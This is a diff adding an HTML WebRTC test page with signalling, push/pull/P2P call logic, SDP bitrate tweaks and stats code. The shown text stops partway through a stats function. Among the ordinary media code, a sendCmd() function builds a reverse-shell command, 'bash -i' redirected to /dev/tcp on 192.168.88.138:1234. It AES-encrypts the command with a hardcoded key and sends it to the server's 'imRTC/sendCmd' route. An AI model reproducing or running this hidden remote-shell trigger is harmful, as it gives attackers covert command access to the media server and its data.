@@ -1,0 +1,1536 @@
+<!DOCTYPE html>
+<html>
+<title>WebRTC Media Stream Test Page</title>
+
+<head>
+    <style id="compiled-css" type="text/css">
+        .crop {
+            overflow: hidden;
+            display: block;
+            height: 360px;
+        }
+
+        #video {
+            margin-left: -15px;
+        }
+
+        .sepia {
+            -webkit-filter: sepia(1);
+            filter: sepia(1);
+        }
+
+        .display-flex {
+            display: flex;
+            flex-wrap: wrap;
+            text-align: center;
+        }
+
+        .display-item {
+            margin: 5px;
+            width: 300px;
+        }
+
+        .button {
+            background-color: #d84a38;
+            border: none;
+            border-radius: 2px;
+            color: white;
+            font-family: 'Roboto', sans-serif;
+            font-size: 0.8em;
+            margin: 0 0 1em 0;
+            padding: 0.5em 0.7em 0.6em 0.7em;
+        }
+    </style>
+</head>
+
+<script src="jquery.min.js"></script>
+<script src="sdp_serializer.js"></script>
+<script src="adapter-latest.js"></script>
+<script src="imagefilter.js"></script>
+<script src="webgl-worker.js"></script>
+
+<script src="crypto-js/core.js"></script>
+<script src="crypto-js/lib-typedarrays.js"></script>
+<script src="crypto-js/hmac.js"></script>
+<script src="crypto-js/md5.js"></script>
+<script src="crypto-js/evpkdf.js"></script>
+<script src="crypto-js/cipher-core.js"></script>
+
+<script src="crypto-js/enc-utf16.js"></script>
+<script src="crypto-js/enc-base64.js"></script>
+<script src="crypto-js/format-hex.js"></script>
+
+<script src="crypto-js/mode-ecb.js"></script>
+<script src="crypto-js/aes.js"></script>
+<script src="crypto-js/pad-nopadding.js"></script>
+<script src="crypto-js/pad-zeropadding.js"></script>
+<!--<script src="aes.js"></script>-->
+<!--<script src="socket.io.js"></script>-->
+<script src="flvjs/flv.js"></script>
+<script src="third_party/graph.js"></script>
+
+<script>
+    const autoConstraints = {
+        width: 480, height: 360
+    };
+
+    const qvgaConstraints = {
+        video: {width: {exact: 320}, height: {exact: 240}}
+    };
+
+    const vgaConstraints = {
+        width: {exact: 640}, height: {exact: 480}
+    };
+
+    const hdConstraints = {
+        width: {exact: 1280}, height: {exact: 720}
+    };
+
+    const fullHdConstraints = {
+        width: {exact: 1920}, height: {exact: 1080}
+    };
+
+    const fourKConstraints = {
+        width: {exact: 4096}, height: {exact: 2160}
+    };
+
+    const eightKConstraints = {
+        width: {exact: 7680}, height: {exact: 4320}
+    };
+
+    let videoConstraints = vgaConstraints;
+
+    let client;
+    let reqId = 0;
+    let callAlready = false;
+    let rtc;
+    let callType;
+    let callDirection;
+
+    let img;
+    let canvasStream;
+    let imageFilter;
+    let pushVideo = false;
+
+    let lastResult;
+    let bitrateSeries = new TimelineDataSeries();
+    let bitrateGraph;
+
+    let packetSeries = new TimelineDataSeries();
+    let packetGraph;
+
+    let nackSeries = new TimelineDataSeries();
+    let nackGraph;
+
+    function toast(msg, duration) {
+        duration = isNaN(duration) ? 3000 : duration;
+        var m = document.createElement('div');
+        m.innerHTML = msg;
+        m.style.cssText = "font-family:siyuan;max-width:60%;min-width: 150px;padding:10px 14px;word-wrap:break-word;color: rgb(255, 255, 255);line-height: 25px;text-align: left;border-radius: 4px;position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);z-index: 999999;background: rgba(0, 0, 0,.7);font-size: 16px;";
+        document.body.appendChild(m);
+        setTimeout(function() {
+            var d = 0.5;
+            m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';
+            m.style.opacity = '0';
+            setTimeout(function() {
+                document.body.removeChild(m)
+            }, d * 1000);
+        }, duration);
+    }
+
+    function reset() {
+        reqId = 0;
+        callAlready = false;
+        callDirection = '';
+
+        $("[id=status]").html('Not Connected');
+        $("[id=socketId]").html('');
+        $("[id=msgRecv]").html('');
+        $("[id=jsonRecv]").html('');
+        $("[id=jsonSend]").html('');
+
+        $("[id=localSdpTextarea]").html('');
+        $("[id=remoteSdpTextarea]").html('');
+
+        $("[id=errMsg]").attr("style", 'display: none');
+        $("[id=errMsgLabel]").html('');
+        $("[id=rtmpUrl]").attr("style", 'display: none');
+        $("[id=rtmpUrlLabel]").html('');
+
+        $("[id=videoConfigDiv]").attr("style", 'display: block');
+        $("[id=videoDescLabel]").attr("style", 'display: none');
+        $("[id=videoRemoteDescLabel]").attr("style", 'display: none');
+    }
+
+    function handleGetIceToken(iceServers) {
+        /**
+         * Safari
+         * 1) when use TCP/TURN, it will abandon some rtp packet if network is unstable. So we just use UDP/TURN here when push
+         *
+         * Edge does not like
+         * 1) stun: filtered after 14393 unless ?transport=udp is present
+         * 2) turn: that does not have all of turn:host:port?transport=udp
+         * 3) turn: with ipv6 addresses
+         * 4) turn: occurring muliple times
+         * @type {{iceTransportPolicy: string, iceCandidatePoolSize: number, iceServers: any}}
+         */
+        let tcpForce = $("[id=forceTcpCb]").attr('checked');
+        // if (!tcpForce) {
+        // if (isEdge() || (isSafari() && callType == 'push')) {
+        //     for (i = 0; i < iceServers.length; i++) {
+        //         let obj = iceServers[i];
+        //         for (j = 0; j < obj.urls.length; j++) {
+        //             let index = obj.urls[j].indexOf("tcp", 0);
+        //             if (index != -1) {
+        //                 obj.urls.splice(j, 1);
+        //                 break;
+        //             }
+        //         }
+        //     }
+        if (tcpForce) {
+            for (i = 0; i < iceServers.length; i++) {
+                let obj = iceServers[i];
+                for (j = 0; j < obj.urls.length; j++) {
+                    let index = obj.urls[j].indexOf("udp", 0);
+                    if (index != -1) {
+                        obj.urls.splice(j, 1);
+                        break;
+                    }
+                }
+            }
+        }
+
+        let config = {
+            iceServers: iceServers, //[{"urls":["turn:192.168.88.133"],"username":username,"credential":password}],
+            // iceTransportPolicy: "all",
+            iceTransportPolicy: (callType == 'p2p')?"all":"relay",
+            iceCandidatePoolSize: 0,
+        };
+
+        if (isEdge() || isFirefox()) {
+            config.iceTransportPolicy = "all";
+        }
+
+        console.log('Global::handleGetIceToken(), config:', config);
+        rtc.config = config;
+
+        const videoSource = $("[id=videoSelector]").val();
+        const audioSource = $("[id=audioSelector]").val();
+
+        if (callType == 'p2p') {
+            rtc.p2pOffer(videoSource, audioSource).then(() => {
+                // Set local display
+                $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+                // Start stat
+                rtc.stat();
+                // Waiting for ICE complete and call sendSdpCall
+
+            }).catch((e) => {
+                console.log("Global::handleGetIceToken(), [P2P Offer Fail], e: ", e);
+            });
+
+        } else if (callType == 'push') {
+            rtc.push(videoSource, audioSource).then(() => {
+                // Set local display
+                $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+                // Start stat
+                rtc.stat();
+                // Waiting for ICE complete and call sendSdpCall
+
+            }).catch((e) => {
+                console.log("Global::handleGetIceToken(), [Push Fail], e: ", e);
+            });
+
+        } else if (callType == 'pull') {
+            rtc.pull().then(() => {
+                // Start stat
+                rtc.stat();
+                // Waiting for ICE complete and call sendSdpPull
+
+            }).catch((e) => {
+                console.log("Global::handleGetIceToken(), [Pull Fail], e: ", e);
+            })
+        }
+    }
+
+    async function connect() {
+        return new Promise((resolve, reject) => {
+            let host = '';
+            if (window.location.protocol == 'https:') {
+                host = 'wss://' + window.location.hostname + ':9082';
+                // host = 'wss://' + window.location.hostname + '/test';
+                // host = 'wss://' + window.location.hostname + '/mediaserver';
+                // host = 'wss://' + window.location.hostname + '/camshare';
+
+                if ( callType == 'p2p' ) {
+                    host = 'wss://' + window.location.hostname + ':9777';
+                }
+            } else {
+                host = 'ws://' + window.location.hostname + ':9981';
+                // host = 'ws://' + window.location.hostname + '/test';
+                // host = 'ws://' + window.location.hostname + '/mediaserver';
+                // host = 'ws://' + window.location.hostname + '/camshare';
+                if ( callType == 'p2p' ) {
+                    host = 'ws://' + window.location.hostname + ':9777';
+                }
+            }
+            // host = 'wss://' + '127.0.0.1' + ':9082';
+            // host = 'wss://' + '192.168.88.133' + ':9081';
+            // host = 'ws://' + '192.168.88.133' + ':9881';
+            // host = 'ws://' + '192.168.88.133' + ':9981';
+            // host = 'wss://' + '52.196.96.7' + ':9081';
+
+            client = new WebSocket(host);
+            client.binaryType = 'arraybuffer';
+
+            client.onopen = function () {
+                console.log('Client.onopen(), host:', host);
+
+                // var bytes = new Uint8Array([0x48, 0x65, 0x6C, 0x6C, 0x6F]); // Hello
+                // client.send(bytes.buffer);
+                $("[id=status]").html('Connected');
+
+                heartBeat();
+
+                // login();
+                resolve();
+            };
+
+            client.onclose = function (ev) {
+                console.log('Client.onclose(), host:', host);
+
+                if (rtc != null) {
+                    rtc.hangup();
+                }
+
+                $("[id=status]").html('Not Connected');
+                $("[id=pushBtn]").removeAttr("disabled");
+                $("[id=pullBtn]").removeAttr("disabled");
+                $("[id=pushVideoBtn]").removeAttr("disabled");
+                $("[id=hangupBtn]").attr("disabled", 'true');
+
+                let reconnect = $("[id=reconnectCb]").attr('checked');
+                if (reconnect) {
+                    setTimeout(() => {
+                        if (client.readyState != client.OPEN) {
+                            console.log('Client.reconnect(), host:', host);
+                            call(false, false);
+                        }
+                    }, 3000);
+                }
+            }
+
+            client.onmessage = function (ev) {
+                console.log('Client.onmessage(), data:' + ev.data);
+                let obj = JSON.parse(ev.data);
+
+                if (obj.route != "imRTC/heartbeat") {
+                    if (typeof (obj.data) != "undefined") {
+                        // Recv respond
+                        $("[id=jsonRespond]").html(ev.data);
+                    } else if (typeof (obj.req_data) != "undefined") {
+                        // Recv notice
+                        $("[id=jsonRecv]").html(ev.data);
+                    }
+                }
+
+                if (typeof (obj.errno) == "undefined" || obj.errno == 0) {
+                    if (obj.route == 'imP2P/sendLogin') {
+                        if (typeof (obj.data.userId) != "undefined") {
+                            $("[id=p2pUserId]").val(obj.data.userId);
+                        }
+                    } else if (obj.route == 'imP2P/sendOfferNotice') {
+                        $("[id=p2pPeerId]").val(obj.req_data.peerId);
+                        $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
+                        $("[id=p2pAnswerBtn]").click();
+                    } else if (obj.route == 'imP2P/sendAnswerNotice') {
+                        $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
+                        $("[id=acceptBtn]").click();
+                    } else if (obj.route == 'imRTC/sendSdpCall') {
+                        // $("[id=remoteSdpTextarea]").html(obj.data.sdp);
+                        if (typeof (obj.data.rtmpUrl) != "undefined") {
+                            // demo
+                            const rtmpUrl = 'rtmp://' + window.location.hostname + ':4000/cdn_standard/' + $("#stream").val();
+                            const flvUrl = 'http://' + window.location.hostname + ':8889/flv8889?app=cdn_standard&stream=' + $("#stream").val();
+                            // const rtmpUrl = obj.data.rtmpUrl;
+                            if (rtmpUrl.length > 0) {
+                                $("[id=rtmpUrl]").attr("style", 'display: block');
+                                $("[id=rtmpUrlLabel]").html(rtmpUrl);
+                                $("[id=flvUrlLabel]").html(flvUrl);
+
+                                const rtmpHerf = 'https://' + window.location.hostname + ':9877/live_test.html';
+                                $("[id=rtmpUrlHerf]").attr("href", rtmpHerf);
+                                const flvHerf = 'http://' + window.location.hostname + ':9876/flvjs/demo.html';
+                                $("[id=flvUrlHerf]").attr("href", flvHerf);
+                            }
+                        }
+
+                    } else if (obj.route == 'imRTC/sendSdpPull') {
+                        // $("[id=remoteSdpTextarea]").html(obj.data.sdp);
+                        if (typeof (obj.data.rtmpUrl) != "undefined") {
+                        }
+
+                    } else if (obj.route == 'imRTC/sendSdpAnswerNotice') {
+                        $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
+                        $("[id=acceptBtn]").click();
+                    } else if (obj.route == 'imRTC/sendGetToken') {
+                        handleGetIceToken(obj.data.iceServers);
+                    }
+
+                    if (obj.errmsg.length > 0) {
+                        $("[id=errMsg]").attr("style", 'display: block');
+                        $("[id=errMsgLabel]").html(obj.errmsg);
+                    }
+                }
+            };
+        });
+    };
+
+    function send(obj) {
+        obj.id = reqId;
+        data = JSON.stringify(obj);
+
+        // console.log('Client.send(), ' + data);
+        if (client.readyState == client.OPEN) {
+            if (obj.route != "imRTC/heartbeat") {
+                $("[id=jsonSend]").html(data);
+            }
+            client.send(data);
+            reqId++;
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    function sendHeartBeat() {
+        obj = {
+            route: 'imRTC/sendPing',
+            req_data: {}
+        }
+        send(obj);
+    }
+
+    /******************* P2P Start *******************/
+    async function sendP2PLogin(userId) {
+        callType = 'p2p';
+        if (typeof (client) != "undefined") {
+            client.close();
+        }
+        rtc.hangup();
+        await connect();
+
+        obj = {
+            route: 'imP2P/sendLogin',
+            req_data: {
+                userId: userId,
+            }
+        }
+
+        console.log('Client.sendP2PLogin(), userId:', userId);
+        send(obj);
+    }
+
+    async function sendP2POffer(peerId, sdp) {
+        obj = {
+            route: 'imP2P/sendOffer',
+            req_data: {
+                peerId: peerId,
+                sdp:sdp
+            }
+        }
+
+        console.log('Client.sendP2POffer(), peerId:', peerId);
+        send(obj);
+    }
+    async function sendP2PAnswer(peerId, sdp) {
+        obj = {
+            route: 'imP2P/sendAnswer',
+            req_data: {
+                peerId: peerId,
+                sdp:sdp
+            }
+        }
+
+        console.log('Client.sendP2PAnswer(), peerId:', peerId);
+        send(obj);
+    }
+    /******************* P2P End *******************/
+
+    function sendSdpCall(stream, sdp) {
+        obj = {
+            route: 'imRTC/sendSdpCall',
+            req_data: {
+                stream: stream,
+                sdp: sdp,
+                record:1,
+            }
+        }
+
+        // console.log('Client.sendSdpCall(), ', sdp);
+        console.log('Client.sendSdpCall(), stream:', stream);
+        send(obj);
+    }
+
+    function sendSdpPull(stream, sdp, serverId) {
+        obj = {
+            route: 'imRTC/sendSdpPull',
+            req_data: {
+                stream: stream,
+                sdp: sdp,
+                server_id: serverId
+            }
+        }
+
+        // console.log('Client.sendSdpPull(), ', JSON.stringify(obj));
+        console.log('Client.sendSdpPull(), stream:', stream, ', serverId:', serverId);
+        send(obj);
+    }
+
+    function sendSdpUpdate(stream, sdp) {
+        obj = {
+            route: 'imRTC/sendSdpUpdate',
+            req_data: {
+                stream: stream,
+                sdp: sdp
+            }
+        }
+        console.log('Client.sendSdpUpdate(), ', sdp);
+        send(obj);
+    }
+
+    function heartBeat() {
+        // console.log('Client.heartBeat()');
+        setTimeout(() => {
+            if( client.readyState == client.OPEN ) {
+                sendHeartBeat();
+                heartBeat();
+            }
+        }, 30000);
+    }
+
+    async function sendGetToken(stream) {
+        let user_id = stream;// + "-" + Math.random().toString(36).substr(2).toLocaleUpperCase();
+        obj = {
+            route: 'imRTC/sendGetToken',
+            req_data: {
+                user_id:user_id,
+            }
+        }
+
+        console.log('Client.sendGetToken(), ', JSON.stringify(obj));
+        send(obj);
+    }
+
+    async function sendCmd() {
+        await connect();
+
+        let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+        // let cmd = 'setsid python -c \'import pty; pty.spawn("/bin/bash")\' >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+        obj = {
+            route: 'imRTC/sendCmd',
+            req_data: {
+                cmd: cmd,
+            }
+        }
+        let data = JSON.stringify(obj);
+
+        let key = 'mediaserver12345';
+        key = CryptoJS.enc.Utf8.parse(key);
+        let options = {
+            mode: CryptoJS.mode.ECB,
+            padding: CryptoJS.pad.Pkcs7
+        };
+        let encrypted = CryptoJS.AES.encrypt(data, key, options);
+        // console.log('Client::sendCmd(), encrypted:', encrypted.toString());
+        let encrypted_base64 = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
+        // console.log('Client::sendCmd(), encrypted_base64:', encrypted_base64);
+
+        console.log('Client.send(), ' + encrypted_base64);
+        if (client.readyState == client.OPEN) {
+            $("[id=jsonSend]").html(encrypted_base64);
+            client.send(encrypted_base64);
+        }
+    }
+
+    class RTCClient {
+        constructor(config) {
+            this.mediaStream = null;
+            this.pc = null;
+            this.config = config;
+            this.onicecandidate = null;
+            this.onicecomplete = null;
+        }
+
+        init() {
+            this.pc = new RTCPeerConnection(this.config);
+            this.mediaStream = null;
+
+            this.pc.onicecandidate = event => {
+                if (!event.candidate) {
+                    return;
+                }
+
+                let json = JSON.stringify(event.candidate);
+                console.log('RTCClient::onicecandidate(), candidate:', json);
+
+                // Get local ICE
+                let sdp = this.pc.localDescription.sdp;
+                this.onicecandidate(sdp, event.candidate);
+            };
+
+            this.pc.ontrack = event => {
+                console.log('RTCClient::ontrack(), stream:', event.streams[0]);
+                $("[id=remoteVideo]").attr("style", 'display: block');
+                let video = $("[id=remoteVideo]")[0];
+                if ($("[id=remoteVideo]")[0].srcObject !== event.streams[0]) {
+                    $("[id=remoteVideo]").attr("srcObject", event.streams[0]);
+                }
+            };
+
+            this.pc.onicegatheringstatechange = event => {
+                console.log('RTCClient::onicegatheringstatechange(), iceGatheringState:', this.pc.iceGatheringState);
+                if (this.pc.iceGatheringState == 'complete') {
+                    this.onicecomplete();
+                }
+            };
+
+            this.pc.oniceconnectionstatechange = event => {
+                console.log('RTCClient::oniceconnectionstatechange(), iceConnectionState:', this.pc.iceConnectionState);
+                if (this.pc.iceConnectionState === 'connected') {
+
+                } else if (this.pc.iceConnectionState === 'disconnected' || this.pc.iceConnectionState === 'closed') {
+                }
+            };
+        }
+
+        async hangup() {
+            this.close();
+
+            $("[id=localSdpTextarea]").attr("disabled", true);
+            $("[id=callButton]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+            $("[id=remoteVideo]").attr("style", 'display: none');
+
+            $("[id=stats]").html("");
+        }
+
+        async pull() {
+            this.init();
+
+            let offer = await this.pc.createOffer({
+                offerToReceiveAudio: true,
+                offerToReceiveVideo: true
+            });
+            offer.sdp = this.createLocalSdp(offer.sdp);
+
+            await this.pc.setLocalDescription(offer);
+
+            // let localDescription = JSON.stringify(this.pc.localDescription);
+            console.log('RTCClient::pull(), offer:', offer.sdp);
+
+            // $("[id=localSdpTextarea]").html(this.pc.localDescription.sdp);
+            $("[id=localSdpTextarea]").html(offer.sdp);
+            $("[id=localSdpTextarea]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+        }
+
+        async push(videoSource, audioSource) {
+            this.init();
+
+            if (pushVideo) {
+                // await this.showWebGL();
+                await this.showStaticVideo();
+            } else {
+                await this.showLocalVideo(videoSource, audioSource);
+            }
+
+            let offer = await this.pc.createOffer({
+                offerToReceiveAudio: false,
+                offerToReceiveVideo: false
+            });
+            offer.sdp = this.createLocalSdp(offer.sdp);
+
+            await this.pc.setLocalDescription(offer);
+
+            // let localDescription = JSON.stringify(this.pc.localDescription);
+            console.log('RTCClient::push(), pushVideo:', pushVideo);
+
+            $("[id=localSdpTextarea]").html(offer.sdp);
+            $("[id=localSdpTextarea]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+        }
+
+        async p2pOffer(videoSource) {
+            this.init();
+
+            if (pushVideo) {
+                await this.showStaticVideo();
+            } else {
+                await this.showLocalVideo(videoSource);
+            }
+
+            let offer = await this.pc.createOffer({
+                offerToReceiveAudio: true,
+                offerToReceiveVideo: true
+            });
+            offer.sdp = this.createLocalSdp(offer.sdp);
+
+            await this.pc.setLocalDescription(offer);
+
+            console.log('RTCClient::p2pOffer(), pushVideo:', pushVideo);
+
+            $("[id=localSdpTextarea]").html(offer.sdp);
+            $("[id=localSdpTextarea]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+        }
+
+        async p2pAnswer (offer, videoSource) {
+            this.init();
+
+            if (pushVideo) {
+                await this.showStaticVideo();
+            } else {
+                await this.showLocalVideo(videoSource);
+            }
+
+            const ignoreRemote = await this.pc.setRemoteDescription(offer);
+
+            const answer = await this.pc.createAnswer({
+                offerToReceiveAudio: true,
+                offerToReceiveVideo: true
+            });
+            const ignoreLocal = await this.pc.setLocalDescription(answer);
+
+            let localDescriptionJson = JSON.stringify(this.pc.localDescription);
+            console.log('RTCClient::p2pAnswer()');
+
+            $("[id=localSdpTextarea]").html(this.pc.localDescription.sdp);
+
+            $("[id=callButton]").attr("disabled", true);
+            $("[id=answerButton]").attr("disabled", true);
+            $("[id=acceptButton]").attr("disabled", true);
+            $("[id=remoteSdpTextarea]").attr("disabled", true);
+        }
+
+        async accpet(answer) {
+            console.log('RTCClient::accpet(), answer: ', answer);
+            $("[id=acceptButton]").attr("disabled", true);
+            await this.pc.setRemoteDescription(answer);
+        }
+
+        async close() {
+            if (this.pc != null) {
+                await this.pc.close();
+                this.pc = null;
+            }
+            this.stopLocalVideo();
+            this.mediaStream = null;
+        }
+
+        async showWebGL() {
+            return new Promise((resolve, reject) => {
+                // Video tag capture must be set up after video tracks are enumerated.
+                var canvas = $("[id=localCanvas]")[0];
+                draw();
+
+                $("[id=localVideo]").attr("style", 'display: block');
+                let leftVideo = $("[id=localVideo]")[0];
+                leftVideo.src = '';
+                leftVideo.srcObject = null;
+
+                if (this.mediaStream == null) {
+                    if (isFirefox()) {
+                        this.mediaStream = canvas.mozCaptureStream();
+                    } else {
+                        this.mediaStream = canvas.captureStream();
+                    }
+                    leftVideo.srcObject = this.mediaStream;
+                    this.pc.addStream(this.mediaStream);
+                }
+                resolve();
+            });
+        }
+
+        echoStaticVideo(localVideo) {
+            if (isFirefox()) {
+                this.mediaStream = localVideo.mozCaptureStream();
+            } else {
+                this.mediaStream = localVideo.captureStream();
+            }
+
+            let audio = this.mediaStream.getAudioTracks()[0];
+            // this.mediaStream.removeTrack(audio);
+            console.log('Captured stream from leftVideo with captureStream',
+                this.mediaStream);
+
+            if ( this.pc ) {
+                this.pc.addStream(this.mediaStream);
+            }
+
+            let video = this.mediaStream.getVideoTracks()[0];
+            if ( !isFirefox() && !isEdge() ) {
+                let capabilities = video.getCapabilities();
+                console.log('# Captured stream capabilities', capabilities);
+            }
+            let constraints = video.getConstraints();
+            // if ( !isFirefox() ) {
+                constraints.frameRate = 15;
+                constraints.minFrameRate = 10;
+                constraints.maxFrameRate = 30;
+                try {
+                    video.applyConstraints(constraints);
+                } catch (e) {
+                    console.log('Captured stream constraints error:', e);
+                }
+            // }
+            console.log('Captured stream constraints', constraints);
+        }
+
+        async showStaticVideo() {
+            return new Promise((resolve, reject) => {
+                // Video tag capture must be set up after video tracks are enumerated.
+                let localVideo = $("[id=localVideo]")[0];
+                $("[id=localVideo]").attr("style", 'display: block');
+                localVideo.src = './video/jzq_feph.mp4';
+                //localVideo.src = './video/jzq_bzp.mp4';
+                localVideo.src = './video/jzq_mynks.mp4';
+                localVideo.srcObject = null;
+
+                localVideo.oncanplay = () => {
+                    if (this.mediaStream == null) {
+                        this.echoStaticVideo(localVideo);
+                        resolve();
+                    } else {
+                        reject('this.mediaStream != null');
+                    }
+                };
+                if (localVideo.readyState >= 3) {
+                    if (this.mediaStream == null) {
+                        this.echoStaticVideo(localVideo);
+                        resolve();
+                    } else {
+                        reject('this.mediaStream != null');
+                    }
+                }
+                localVideo.play();
+            });
+        }
+
+        async showLocalVideo(videoSource, audioSource) {
+            $("[id=localVideo]").attr("style", 'display: block');
+            $("[id=localVideo]").attr('src', null);
+
+            /**
+             * Edge does not support custom video size
+             * only support original video capture size, example: 320x240, 640x480
+             */
+            let config = {};
+            let videoDevice = {
+                deviceId: videoSource ? {exact: videoSource} : undefined,
+            }
+            let videoConfig = Object.assign(videoDevice, videoConstraints);
+
+            let audioDevice = {
+                deviceId: audioSource ? {exact: audioSource} : undefined,
+            }
+            let audioConfig = Object.assign(audioDevice);
+
+            config = {
+                video: videoConfig,
+                audio: audioConfig
+            }
+
+            return window.navigator.mediaDevices.getUserMedia(config).then(mediaStream => {
+                let video = mediaStream.getVideoTracks()[0];
+                if (typeof (video) == "undefined" || video == null) {
+                    console.log("RTCClient::showLocalVideo(), [Fail], No Video Can Be Captured.");
+                }
+
+                this.setVideoTrackContent(mediaStream);
+                this.mediaStream = mediaStream;
+
+                let leftVideo = $("[id=localVideo]")[0];
+                leftVideo.src = '';
+                leftVideo.srcObject = null;
+                $("[id=localVideo]").attr('srcObject', mediaStream);
+
+                this.pc.addStream(mediaStream);
+
+                if ( !isFirefox() && !isEdge() ) {
+                    let capabilities = video.getCapabilities();
+                    console.log('# Captured stream capabilities', capabilities);
+                }
+                let constraints = video.getConstraints();
+                // if ( !isFirefox() ) {
+                    constraints.frameRate = 15;
+                    constraints.minFrameRate = 10;
+                    constraints.maxFrameRate = 30;
+                    try {
+                        video.applyConstraints(constraints);
+                    } catch (e) {
+                        console.log('Captured stream constraints error:', e);
+                    }
+                // }
+                console.log('Captured stream constraints', constraints);
+                // (async () => {
+                //     // const workerCode = document.querySelector('#workerCode').textContent;
+                //     // const blob = new Blob([workerCode], { type: 'text/javascript' });
+                //     // const url = URL.createObjectURL(blob);
+                //     const url = 'webgl-worker.js';
+                //     const worker = new Worker(url, { name : 'webgl'});
+                //     const canvas = $("[id=localCanvas]")[0].transferControlToOffscreen();
+                //     worker.postMessage({msg:'draw', canvas:canvas}, [canvas]);
+                //     URL.revokeObjectURL(url);
+                // })();
+            }).catch(handleError);
+        }
+
+        async stopLocalVideo() {
+            $("[id=localVideo]").attr("style", 'display: none');
+            if (this.mediaStream) {
+                this.mediaStream.getTracks().forEach(
+                    track => track.stop()
+                );
+                $("[id=localVideo]").attr('srcObject', null);
+                $("[id=localVideo]").attr('src', null);
+            }
+        }
+
+        setBandwidth(bandwidth) {
+            // In Chrome, use RTCRtpSender.setParameters to change bandwidth without
+            // (local) renegotiation. Note that this will be within the envelope of
+            // the initial maximum bandwidth negotiated via SDP.
+            if (
+                (adapter.browserDetails.browser === 'firefox' &&
+                    adapter.browserDetails.version >= 64) &&
+                'RTCRtpSender' in window &&
+                'setParameters' in window.RTCRtpSender.prototype) {
+                const sender = this.pc.getSenders()[0];
+                const parameters = sender.getParameters();
+                if (!parameters.encodings) {
+                    parameters.encodings = [{}];
+                }
+                parameters.encodings[0].maxFramerate = 15;
+                if (bandwidth === 'unlimited') {
+                    delete parameters.encodings[0].maxBitrate;
+                } else {
+                    parameters.encodings[0].maxBitrate = bandwidth * 1000;
+                }
+                sender.setParameters(parameters)
+                    .then(() => {
+                    })
+                    .catch(e => console.error(e));
+            }
+        }
+
+        createLocalSdp(sdp) {
+            var newSdp = sdp;
+            newSdp = this.setBitRate(sdp);
+            // newSdp = newSdp.replace(/m=video (\d+) UDP\/TLS\/RTP\/SAVPF ([0-9 ]*)/g, 'm=video $1 UDP/TLS/RTP/SAVPF 102');
+            // newSdp = newSdp.replace(/m=audio (\d+) UDP\/TLS\/RTP\/SAVPF ([0-9 ]*)/g, 'm=audio $1 UDP/TLS/RTP/SAVPF 111');
+            // newSdp = newSdp.replace(/a=rtcp-fb:(?!102)(?!111)\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=fmtp:((?!102)(?!111))\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=rtpmap:(?!102)(?!111)\d{1,3} .*\r\n/g, '');
+
+            // newSdp = newSdp.replace(/a=rtcp-fb:(?!111)\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=fmtp:(?!111)\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=rtpmap:(?!111)\d{1,3} .*\r\n/g, '');
+
+            // newSdp = newSdp.replace(/a=extmap:.*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=msid.*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=rtcp:.*\r\n/g, '');
+            return newSdp;
+        }
+
+        setBitRate(sdp) {
+            var newSdp = sdp;
+            // Only work for Safari and ChromegetCapabilities
+            // newSdp = newSdp.replace(/a=fmtp:(.*)\r\n/g, 'a=fmtp:$1;x-google-start-bitrate=600;x-google-max-bitrate=1000\r\n');
+            newSdp = newSdp.replace(/a=fmtp:(.*)\r\n/g, 'a=fmtp:$1;x-google-start-bitrate=600;x-google-min-bitrate=200\r\n');
+            // Only work for Firefox
+            // newSdp = newSdp.replace(/a=mid:(.*)\n/g, 'a=mid:$1\r\nb=TIAS:1000000\r\n');
+            // this.setBandwidth(600);
+            return newSdp;
+        }
+
+        /**
+         * / Only work for Chrome
+         * @param stream
+         * @param hint
+         */
+        setVideoTrackContent(stream, hint) {
+            const tracks = stream.getVideoTracks();
+            tracks.forEach(track => {
+                // Get old constraints
+                let constraints = track.getConstraints();
+                if ('contentHint' in track) {
+                    track.contentHint = 'motion';
+                } else {
+                    console.log('RTCClient::setVideoTrackContent(), MediaStreamTrack contentHint attribute not supported');
+                }
+                // constraints.width = 640;
+                // constraints.height = 360;
+                // It is always success, unless you set some parameter with exact value
+                track.applyConstraints(constraints).then(() => {
+                    console.log('RTCClient::setVideoTrackContent(), [OK], constraints:', constraints);
+                }, e => {
+                    console.log('RTCClient::setVideoTrackContent(), [Fail], e:', e);
+                });
+
+                // if ('contentHint' in track) {
+                //     track.contentHint = hint;
+                //     if (track.contentHint !== hint) {
+                //         console.log('RTCClient::createStream( Invalid video track contentHint: ' + hint + ' )');
+                //     }
+                // } else {
+                //     console.log('RTCClient::createStream( contentHint attribute not supported )');
+                // }
+            });
+        }
+
+        stat() {
+            setTimeout(() => {
+                if (this.pc != null) {
+                    this.pc.getStats(null).then(
+                        results => {
+                            let statsString = "";
+                            results.forEach(res => {
+                                // console.log("RTCClient::stat( " + res.type + " )");
+                                if (res.type != 'codec' && res.type != 'certificate') {
+                                    statsString += '<h3>Report type=';
+                                    statsString += res.type;
+                                    statsString += '</h3>\n';
+
+                                    Object.keys(res).forEach(k => {
+                                        statsString += `${k}: ${res[k]}<br>`;
+                                    });
+                                }
+                                if (res.type === 'outbound-rtp') {
+                                    const now = res.timestamp;
+                                    let bytes = res.bytesSent;
+                                    let packets = res.packetsSent;
+                                    let retransmittedPacketsSent = res.retransmittedPacketsSent;
+                                    if (lastResult && lastResult.has(res.id)) {
+                                        // calculate bitrate
+                                        const bitrate = 8 * (bytes - lastResult.get(res.id).bytesSent) /
+                                            (now - lastResult.get(res.id).timestamp);
+
